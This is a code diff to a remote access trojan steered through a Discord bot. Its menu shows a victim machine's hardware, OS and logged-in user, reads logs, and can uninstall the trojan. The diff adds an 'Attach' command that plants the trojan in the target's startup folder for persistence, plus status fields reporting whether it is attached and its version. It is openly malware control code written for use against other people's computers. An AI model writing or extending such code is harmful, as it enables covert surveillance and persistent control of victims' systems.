@@ -7,6 +7,7 @@ from helpers.hardware import *
 from datetime import datetime
 import time
 from core.logEntry import log_entries
+from helpers.attach import *
 
 def home():
     embed = discord.Embed(
@@ -40,7 +41,7 @@ class Dropper(discord.ui.Select):
     def __init__(self):
         options = [
             discord.SelectOption(label='Functions', description='Functions list (main menu)', emoji='📜', value="fun"),
-            discord.SelectOption(label='Resources', description='View current target hardware & preformance', emoji='🔋', value="res"),
+            discord.SelectOption(label='Info', description='View current target hardware & system/rat properties', emoji='🔋', value="res"),
             discord.SelectOption(label='Log', description='Access the \"thing\"\'s logs', emoji='📝', value="log"),
             discord.SelectOption(label='Attach', description='Attempt attaching to the startup folder', emoji='📎', value="attach"),
             discord.SelectOption(label='Uninstall', description='Delete the \"thing\" from the target completely', emoji='❌', value="remove"), 
@@ -89,12 +90,17 @@ class Dropper(discord.ui.Select):
             for disk in disks.disks:
                 description += f"> **Disk {disk['name']}** `{disk['size_gb']}GB` (`{disk['free_gb']}GB` free)\n"
                 
+            attached = isAttached()    
             description += (
-                "**OS**\n"
+                "**OS & RAT**\n"
                 f"> **Name**: {oss['os']} {oss['release']}\n"
                 f"> **Version**: `{oss['version']}`\n"
                 f"> **Architecture**: `{oss['arch']}`\n"
-                f"> **Computer**: {oss['computer']} (user: {oss['current_user']})"
+                f"> **Computer**: {oss['computer']} (user: {oss['current_user']})\n"
+                f"> **Architecture**: `{oss['arch']}`\n"
+                f"> **RAT attached?** {'yes' if attached else 'no'}\n"
+                f"> **RAT Attach shortcut**: {config.attach_shortcut_name}\n"
+                f"> **RAT Version**: `{config.version}`"
             )    
                 
             embed = discord.Embed(title="Resources", color=config.embedcolor)
@@ -116,6 +122,16 @@ class Dropper(discord.ui.Select):
               embed = discord.Embed(title="Log", description=f"```{ihatediscord}```\n*(low level logs may be hidden)*", color=config.embedcolor)
               embed.set_footer(text=f"Log file {datetime.now().date()}")
               await interaction.response.edit_message(embed=embed, view=Dropperview(log=log_file)) 
+          elif so == "attach":
+              embed = discord.Embed(description=f"⏳ Attaching...", color=discord.Color.orange())
+              m =await interaction.response.edit_message(embed=embed, view=None)
+              s, mm = attach()
+              msg = await interaction.channel.fetch_message(m.message_id)
+              if s == True:
+                embed = discord.Embed(title="Success", description=f"RAT has been attached successfully", color=config.embedcolor)  
+              else:  
+                embed = discord.Embed(title="Attach failed", description=f"RAT has failed to attach\n> Error: `{mm}`", color=config.embederrorcolor) 
+              msg.edit(embed=embed, view=Dropperview())                  
           else:
               await interaction.response.send_message("soon inshallah", ephemeral=True)     
                      
